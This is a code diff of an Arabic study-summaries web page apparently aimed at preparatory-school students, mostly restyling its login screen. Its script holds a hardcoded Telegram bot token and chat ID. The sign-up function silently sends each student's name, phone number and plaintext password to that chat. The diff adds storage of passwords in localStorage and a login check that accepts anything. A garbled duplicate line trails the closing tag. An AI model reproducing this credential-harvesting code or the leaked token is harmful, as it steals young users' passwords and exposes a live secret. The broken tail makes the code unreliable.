@@ -6,16 +6,6 @@
     <title>منصة ملخصات 3 إعدادي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #090d16;
-            --card-bg: #111827;
-            --card-border: #1f293d;
-            --primary: #3b82f6;
-            --whatsapp-color: #25d366;
-            --text-main: #f9fafb;
-            --text-muted: #9ca3af;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
@@ -24,19 +14,19 @@
 
         body {
             font-family: 'Cairo', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            background-color: #050b14;
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
 
-        /* نافذة التسجيل والدخول */
+        /* نافذة التسجيل والدخول واضحة جداً */
         .auth-overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(9, 13, 22, 0.98);
+            background: rgba(2, 6, 15, 0.98);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -45,25 +35,26 @@
         }
 
         .auth-box {
-            background: linear-gradient(145deg, #131c2e, #0d1320);
-            border: 1px solid rgba(59, 130, 246, 0.4);
+            background: #111e38;
+            border: 2px solid #3b82f6;
             border-radius: 20px;
             padding: 30px 25px;
             width: 100%;
             max-width: 400px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
         }
 
         .auth-box h2 {
-            font-size: 1.5rem;
+            font-size: 1.7rem;
             margin-bottom: 10px;
             color: #60a5fa;
+            font-weight: 900;
         }
 
         .auth-box p {
-            color: var(--text-muted);
-            font-size: 0.85rem;
+            color: #e5e7eb;
+            font-size: 0.9rem;
             margin-bottom: 20px;
         }
 
@@ -75,31 +66,36 @@
         .input-group label {
             display: block;
             margin-bottom: 5px;
-            font-size: 0.85rem;
-            color: #d1d5db;
+            font-size: 0.9rem;
+            color: #ffffff;
+            font-weight: 700;
         }
 
         .input-group input {
             width: 100%;
-            padding: 10px 12px;
+            padding: 12px;
             border-radius: 10px;
-            background-color: #090d16;
-            border: 1px solid var(--card-border);
-            color: #fff;
+            background-color: #050b14;
+            border: 1px solid #4b5563;
+            color: #ffffff;
             font-family: 'Cairo', sans-serif;
             outline: none;
-            font-size: 0.9rem;
+            font-size: 1rem;
+        }
+
+        .input-group input::placeholder {
+            color: #9ca3af;
         }
 
         .btn-auth {
             width: 100%;
-            padding: 12px;
+            padding: 13px;
             background: #2563eb;
             border: none;
             border-radius: 10px;
             color: white;
             font-family: 'Cairo', sans-serif;
-            font-size: 1rem;
+            font-size: 1.1rem;
             font-weight: 700;
             cursor: pointer;
             margin-top: 10px;
@@ -107,8 +103,8 @@
 
         .switch-auth {
             margin-top: 15px;
-            font-size: 0.85rem;
-            color: var(--text-muted);
+            font-size: 0.9rem;
+            color: #d1d5db;
         }
 
         .switch-auth span {
@@ -124,8 +120,8 @@
             justify-content: space-between;
             align-items: center;
             padding: 15px 20px;
-            background-color: #0d1320;
-            border-bottom: 1px solid var(--card-border);
+            background-color: #111e38;
+            border-bottom: 1px solid #1f293d;
         }
 
         .nav-brand {
@@ -142,8 +138,8 @@
         }
 
         .welcome-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
+            background: #111e38;
+            border: 1px solid #1f293d;
             border-radius: 16px;
             padding: 20px;
             text-align: center;
@@ -151,23 +147,24 @@
         }
 
         .subject-box {
-            background: #131c2e;
-            border: 1px solid var(--card-border);
+            background: #111e38;
+            border: 1px solid #1f293d;
             border-radius: 12px;
             padding: 15px;
             margin-bottom: 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            font-weight: 700;
         }
 
         footer {
             text-align: center;
             padding: 20px;
-            color: var(--text-muted);
+            color: #9ca3af;
             font-size: 0.85rem;
             margin-top: auto;
-            border-top: 1px solid var(--card-border);
+            border-top: 1px solid #1f293d;
         }
     </style>
 </head>
@@ -196,14 +193,14 @@
     <!-- الهيدر -->
     <div class="navbar">
         <div class="nav-brand">🎓 منصة ملخصات 3 إعدادي</div>
-        <button onclick="logout()" style="background:#ef4444; color:#fff; border:none; padding:6px 12px; border-radius:8px; cursor:pointer; font-family:'Cairo';">خروج 🚪</button>
+        <button onclick="logout()" style="background:#dc2626; color:#fff; border:none; padding:8px 14px; border-radius:8px; cursor:pointer; font-family:'Cairo'; font-weight:700;">خروج 🚪</button>
     </div>
 
     <!-- محتوى المنصة -->
     <div class="main-container">
         <div class="welcome-card">
             <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-            <p style="color:var(--text-muted); font-size:0.9rem; margin-top:5px;">اختر المادة لعرض الملخصات والامتحانات والكورسات المتاحة</p>
+            <p style="color:#d1d5db; font-size:0.9rem; margin-top:5px;">اختر المادة لعرض الملخصات والامتحانات والكورسات المتاحة</p>
         </div>
 
         <div id="subjectsContainer">
@@ -236,7 +233,6 @@
         const BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
         const CHAT_ID = '5531994675';
 
-        // التحقق عند الفتح
         window.onload = function() {
             const user = localStorage.getItem('student_phone');
             if (user) {
@@ -297,9 +293,40 @@
                 return;
             }
 
-            // إرسال البيانات للتليجرام
             const msg = `طالب جديد أنشأ حساباً:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+            localStorage.setItem('student_phone', phone);
+            localStorage.setItem('student_pass', pass);
+
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا ' + name + ' 👋';
+        }
+
+        function login() {
+            const phone = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value;
+
+            if (!phone || !pass) {
+                alert('ادخل الهاتف وكلمة المرور!');
+                return;
+            }
+
+            localStorage.setItem('student_phone', phone);
+            localStorage.setItem('student_pass', pass);
+
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل 👋';
+        }
+
+        function logout() {
+            localStorage.clear();
+            location.reload();
+        }
+    </script>
+</body>
+</html>
+.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
             // حفظ الدخول
             localStorage.setItem('student_phone', phone);
